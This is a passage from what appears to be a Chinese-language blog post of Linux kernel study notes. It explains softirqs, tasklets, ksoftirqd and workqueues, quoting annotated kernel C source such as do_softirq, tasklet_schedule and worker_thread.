<li><code>raise_softirq</code> 通过把 [软中断类型位图] 的对应为置为“1”来传递 [被触发的中断类型]</li>
</ul>
<p>执行软中断的函数 do_softirq：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> <span class="title">do_softirq</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 pending;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_interrupt()) <span class="comment">/* 判断是否在中断处理中，如果正在中断处理，就直接返回 */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    local_irq_save(flags); <span class="comment">/* 保存当前寄存器的值 */</span></span><br><span class="line">    pending = local_softirq_pending(); <span class="comment">/* 取得获取软中断类型位图 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pending) <span class="comment">/* 循环处理所有已注册的软中断 */</span></span><br><span class="line">        __do_softirq();</span><br><span class="line"></span><br><span class="line">    local_irq_restore(flags); <span class="comment">/* 恢复寄存器的值到中断处理前 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>只要软中断类型位图 softirq pending 有一位不为“0”，就证明至少有一种软中断需要被处理，然后就会调用 <code>__do_softirq</code></li>
</ul>
<p><strong>tasklet 小片任务</strong></p>
<p>tasklet 也是利用软中断来实现的</p>
<ul>
<li>tasklet 提供了比软中断更好用的接口（其实就是基于软中断又封装了一下）</li>
<li>tasklet 支持动态地注册或注销</li>
</ul>
<p>所以除了对性能要求特别高的情况，一般建议使用 tasklet 来实现自己的中断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span> <span class="comment">/* 链表中的下一个tasklet */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> state;         <span class="comment">/* tasklet状态 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> count;              <span class="comment">/* 引用计数器 */</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>); <span class="comment">/* tasklet处理函数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;          <span class="comment">/* tasklet处理函数的参数 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>已经注册了的 tasklet 由两个数据结构来组织：（两个都是 <code>tasklet_struct</code> 链表）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> **<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">DEFINE_PER_CPU</span><span class="params">(struct tasklet_head, tasklet_vec)</span></span>; <span class="comment">/* 普通 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">DEFINE_PER_CPU</span><span class="params">(struct tasklet_head, tasklet_hi_vec)</span></span>; <span class="comment">/* 优先 */</span></span><br></pre></td></tr></table></figure>
<p>分别由 <code>tasklet_schedule</code> 和 <code>tasklet_hi_schedule</code> 函数进行调度：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __tasklet_schedule(struct tasklet_struct *t)</span><br><span class="line">&#123;</span><br><span class="line">	__tasklet_schedule_common(t, &amp;tasklet_vec,</span><br><span class="line">				  TASKLET_SOFTIRQ);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__tasklet_schedule);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __tasklet_hi_schedule(struct tasklet_struct *t)</span><br><span class="line">&#123;</span><br><span class="line">	__tasklet_schedule_common(t, &amp;tasklet_hi_vec,</span><br><span class="line">				  HI_SOFTIRQ);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__tasklet_hi_schedule);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __tasklet_schedule_common(struct tasklet_struct *t,</span><br><span class="line">				      struct tasklet_head __percpu *headp,</span><br><span class="line">				      <span class="keyword">unsigned</span> <span class="keyword">int</span> softirq_nr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_head</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">	local_irq_save(flags); <span class="comment">/* 关闭本地cpu中断 */</span></span><br><span class="line">	head = this_cpu_ptr(headp); <span class="comment">/* 获取对应的tasklet_struct链表头 */</span></span><br><span class="line">	t-&gt;next = <span class="literal">NULL</span>; </span><br><span class="line">	*head-&gt;tail = t; <span class="comment">/* 把新的tasklet_struct插入链表尾 */</span></span><br><span class="line">	head-&gt;tail = &amp;(t-&gt;next);</span><br><span class="line">	raise_softirq_irqoff(softirq_nr); <span class="comment">/* 调用对应的软中断 */</span></span><br><span class="line">	local_irq_restore(flags); <span class="comment">/* 恢复本地中断传递到给定的状态 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>所有的 tasklet 都通过重复调用 <code>TASKLET_SOFTIRQ</code> 和 <code>HI_SOFTIRQ</code> 两个软中断来实现</li>
<li>当一个 tasklet 被调度时，内核会唤起这两个软中断中的一个，然后执行特定的函数，执行所有已调度的 tasklet</li>
</ul>
<p>静态创建一个 tasklet（直接引用）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_TASKLET(name, func, data)                                      \</span></span><br><span class="line"><span class="meta">	struct tasklet_struct name = &#123; NULL, 0, ATOMIC_INIT(0), func, data &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_TASKLET_DISABLED(name, func, data)                             \</span></span><br><span class="line"><span class="meta">	struct tasklet_struct name = &#123; NULL, 0, ATOMIC_INIT(1), func, data &#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这两个宏都能根据给定的名称静态地创建一个 <code>tasklet_struct</code> 结构</li>
<li>两个宏的区别在于：<ul>
<li>DECLARE_TASKLET 设置引用计数器为“0”，该 tasklet 处于激活状态</li>
<li>DECLARE_TASKLET_DISABLED 设置引用计数器为“1”，该 tasklet 处于禁止状态</li>
</ul>
</li>
</ul>
<p>动态创建一个 tasklet（间接引用）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_init</span><span class="params">(struct tasklet_struct *t,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>), <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	t-&gt;state = <span class="number">0</span>;</span><br><span class="line">	atomic_set(&amp;t-&gt;count, <span class="number">0</span>); <span class="comment">/* 设置原子变量的值(引用计数器设置为&quot;0&quot;) */</span></span><br><span class="line">	t-&gt;func = func;</span><br><span class="line">	t-&gt;data = data;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tasklet_init);</span><br></pre></td></tr></table></figure>
<ul>
<li>其作用就是初始化一个 <code>tasklet_struct</code></li>
</ul>
<p>禁止一个 tasklet（暂缓）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">tasklet_disable</span><span class="params">(struct tasklet_struct *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	tasklet_disable_nosync(t);</span><br><span class="line">	tasklet_unlock_wait(t); <span class="comment">/* 等待正在执行的tasklet执行完成 */</span></span><br><span class="line">	smp_mb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果该 tasklet 正在执行，这个函数就会等到它执行完毕后再返回</li>
</ul>
<p>禁止一个 tasklet（立刻）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">tasklet_disable_nosync</span><span class="params">(struct tasklet_struct *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	atomic_inc(&amp;t-&gt;count);</span><br><span class="line">	smp_mb__after_atomic();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果该 tasklet 正在执行，这个函数也会立刻终止该 tasklet（这样做会丧失许多安全性）</li>
</ul>
<p>启用一个禁止的 tasklet：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">tasklet_enable</span><span class="params">(struct tasklet_struct *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	smp_mb__before_atomic();</span><br><span class="line">	atomic_dec(&amp;t-&gt;count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>删除一个 tasklet：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_kill</span><span class="params">(struct tasklet_struct *t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (in_interrupt())</span><br><span class="line">		pr_notice(<span class="string">&quot;Attempt to kill tasklet from interrupt\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (test_and_set_bit(TASKLET_STATE_SCHED, &amp;t-&gt;state)) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			yield();</span><br><span class="line">		&#125; <span class="keyword">while</span> (test_bit(TASKLET_STATE_SCHED, &amp;t-&gt;state));</span><br><span class="line">	&#125;</span><br><span class="line">	tasklet_unlock_wait(t); <span class="comment">/* 等待正在执行的tasklet执行完成 */</span></span><br><span class="line">	clear_bit(TASKLET_STATE_SCHED, &amp;t-&gt;state);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tasklet_kill);</span><br></pre></td></tr></table></figure>
<p><strong>ksoftirqd 对 softirq 和 tasklet 的优化</strong></p>
<p>当大量软中断出现时（tasklet 底层也是软中断），内核会唤醒一组内核线程来处理这些软中断，这些线程的名称都是 <code>ksoftirqd/n</code></p>
<p>一旦这些线程初始化，就会执行类似于以下代码的死循环：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!softirq_pending(cpu)) <span class="comment">/* 没有发现软中断,则重新调度 */</span></span><br><span class="line">        schedule();</span><br><span class="line">    </span><br><span class="line">    set_current_state(TASK_RUNNING);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(softirq_pending(cpu))&#123; <span class="comment">/* 发现软中断,则执行do_softirq处理软中断 */</span></span><br><span class="line">        do_softirq();</span><br><span class="line">        <span class="keyword">if</span>(need_resched())</span><br><span class="line">            schedule();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>工作队列</strong></p>
<p>工作队列子系统是一个 <strong>用于创建内核线程的接口</strong>，通过它可以创建一个“工作者线程”来专门处理中断的下半部工作（这些工作者线程就叫做 <code>events/n</code>），它在进程的上下文中运行，可以重新调度和睡眠</p>
<ul>
<li>工作队列和 tasklet 不一样，不是基于软中断来实现的</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270-1666871176497.png" class width="1660882969270"> 
<p>工作队列主要用到下面几个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在include/linux/workqueue.h文件中定义 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;             <span class="comment">/* 这个并不是处理函数的参数,而是表示此work是否pending等状态的flag */</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span>         <span class="comment">/* 中断下半部处理函数的链表 */</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;               <span class="comment">/* 处理中断下半部工作的函数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 也是在kernel/workqueue.c文件中定义的</span></span><br><span class="line"><span class="comment"> * 每个workqueue_struct表示一种工作者类型,系统默认的就是events工作者类型</span></span><br><span class="line"><span class="comment"> * 每个工作者类型一般对应n个工作者线程,n就是处理器的个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">pwqs</span>;</span>		<span class="comment">/* WR: all pwqs of this wq */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span>		<span class="comment">/* PR: list of all workqueues */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">mutex</span>;</span>		<span class="comment">/* protects this wq */</span></span><br><span class="line">	<span class="keyword">int</span>			work_color;	<span class="comment">/* WQ: current work color */</span></span><br><span class="line">	<span class="keyword">int</span>			flush_color;	<span class="comment">/* WQ: current flush color */</span></span><br><span class="line">	<span class="keyword">atomic_t</span>		nr_pwqs_to_flush; <span class="comment">/* flush in progress */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wq_flusher</span>	*<span class="title">first_flusher</span>;</span>	<span class="comment">/* WQ: first flusher */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">flusher_queue</span>;</span>	<span class="comment">/* WQ: flush waiters */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">flusher_overflow</span>;</span> <span class="comment">/* WQ: flush overflow list */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">maydays</span>;</span>	<span class="comment">/* MD: pwqs requesting rescue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">worker</span>		*<span class="title">rescuer</span>;</span>	<span class="comment">/* I: rescue worker */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>			nr_drainers;	<span class="comment">/* WQ: drain in progress */</span></span><br><span class="line">	<span class="keyword">int</span>			saved_max_active; <span class="comment">/* WQ: saved pwq max_active */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">workqueue_attrs</span>	*<span class="title">unbound_attrs</span>;</span>	<span class="comment">/* PW: only for unbound wqs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pool_workqueue</span>	*<span class="title">dfl_pwq</span>;</span>	<span class="comment">/* PW: only for unbound wqs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wq_device</span>	*<span class="title">wq_dev</span>;</span>	<span class="comment">/* I: for sysfs interface */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span>	<span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">char</span>			name[WQ_NAME_LEN]; <span class="comment">/* I: workqueue name */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* hot fields used during command issue, aligned to cacheline */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags ____cacheline_aligned; <span class="comment">/* WQ: WQ_* flags */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pool_workqueue</span> __<span class="title">percpu</span> *<span class="title">cpu_pwqs</span>;</span> <span class="comment">/* I: per-cpu pwqs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pool_workqueue</span> __<span class="title">rcu</span> *<span class="title">numa_pwq_tbl</span>[];</span> <span class="comment">/* PWR: unbound pwqs indexed by node */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>worker_thread</code> - 工作线程的处理函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 工作线程函数,所有工人都属于一个工人池,要么是每cpu的,要么是动态的未绑定的</span></span><br><span class="line"><span class="comment">   这些工作人员处理所有工作项,而不考虑其特定的目标工作队列</span></span><br><span class="line"><span class="comment">   唯一的例外是属于&quot;救援人员&quot;的工作队列的工作项,定义在rescuer_thread()中 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">worker_thread</span><span class="params">(<span class="keyword">void</span> *__worker)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">worker</span> *<span class="title">worker</span> =</span> __worker;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">worker_pool</span> *<span class="title">pool</span> =</span> worker-&gt;pool;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* tell the scheduler that this is a workqueue worker */</span></span><br><span class="line">	set_pf_worker(<span class="literal">true</span>);</span><br><span class="line">woke_up:</span><br><span class="line">	spin_lock_irq(&amp;pool-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* am I supposed to die? */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(worker-&gt;flags &amp; WORKER_DIE)) &#123;</span><br><span class="line">		spin_unlock_irq(&amp;pool-&gt;lock);</span><br><span class="line">		WARN_ON_ONCE(!list_empty(&amp;worker-&gt;entry));</span><br><span class="line">		set_pf_worker(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">		set_task_comm(worker-&gt;task, <span class="string">&quot;kworker/dying&quot;</span>); <span class="comment">/* 设置worker-&gt;task的值 */</span></span><br><span class="line">		ida_simple_remove(&amp;pool-&gt;worker_ida, worker-&gt;id);</span><br><span class="line">		worker_detach_from_pool(worker);</span><br><span class="line">		kfree(worker);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	worker_leave_idle(worker); <span class="comment">/* 清除WORKER_IDLE标志位,并退出idle状态链表 */</span></span><br><span class="line">recheck:</span><br><span class="line">	<span class="comment">/* no more worker necessary? */</span></span><br><span class="line">	<span class="keyword">if</span> (!need_more_worker(pool)) <span class="comment">/* 如果当前worker_pool-&gt;worklist中有pending任务,但是当前pool中没有正在运行的线程,need_more_worker()返回true */</span></span><br><span class="line">		<span class="keyword">goto</span> sleep;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do we need to manage? */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!may_start_working(pool)) &amp;&amp; manage_workers(worker)) <span class="comment">/* manage_worker()创建新工作线程之后,还需要跳转到recheck标签处再检查一遍,有可能在创建工作线程过程中整个线程池发生了变化 */</span></span><br><span class="line">		<span class="keyword">goto</span> recheck;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;scheduled list can only be filled while a worker is</span></span><br><span class="line"><span class="comment">	 * preparing to process a work or actually processing it.</span></span><br><span class="line"><span class="comment">	 * Make sure nobody diddled with it while I was sleeping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	WARN_ON_ONCE(!list_empty(&amp;worker-&gt;scheduled)); <span class="comment">/* scheduled链表表示:工作线程准备处理一个work或者正在执行一个work时,才会有work添加到该链表中 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Finish PREP stage.  We&#x27;re guaranteed to have at least one idle</span></span><br><span class="line"><span class="comment">	 * worker or that someone else has already assumed the manager</span></span><br><span class="line"><span class="comment">	 * role.  This is where @worker starts participating in concurrency</span></span><br><span class="line"><span class="comment">	 * management if applicable and concurrency management is restored</span></span><br><span class="line"><span class="comment">	 * after being rebound.  See rebind_workers() for details.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	worker_clr_flags(worker, WORKER_PREP | WORKER_REBOUND);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123; <span class="comment">/* 遍历当前worker_pool-&gt;worklist中的工作,调用process_one_work()进行处理 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> *<span class="title">work</span> =</span></span><br><span class="line">			list_first_entry(&amp;pool-&gt;worklist,</span><br><span class="line">					 struct work_struct, entry);</span><br><span class="line"></span><br><span class="line">		pool-&gt;watchdog_ts = jiffies;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (likely(!(*work_data_bits(work) &amp; WORK_STRUCT_LINKED))) &#123;</span><br><span class="line">			<span class="comment">/* optimization path, not strictly necessary */</span></span><br><span class="line">			process_one_work(worker, work); <span class="comment">/* 处理一个工作 */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(!list_empty(&amp;worker-&gt;scheduled)))</span><br><span class="line">				process_scheduled_works(worker); <span class="comment">/* 就是循环对worker中scheduled链表中的work执行处理,具体处理方式就是调用process_one_work() */</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			move_linked_works(work, &amp;worker-&gt;scheduled, <span class="literal">NULL</span>);</span><br><span class="line">			process_scheduled_works(worker);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (keep_working(pool));</span><br><span class="line"></span><br><span class="line">	worker_set_flags(worker, WORKER_PREP); </span><br><span class="line">sleep:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * pool-&gt;lock is held and there&#x27;s no work to process and no need to</span></span><br><span class="line"><span class="comment">	 * manage, sleep.  Workers are woken up only while holding</span></span><br><span class="line"><span class="comment">	 * pool-&gt;lock or from local cpu, so setting the current state</span></span><br><span class="line"><span class="comment">	 * before releasing pool-&gt;lock is enough to prevent losing 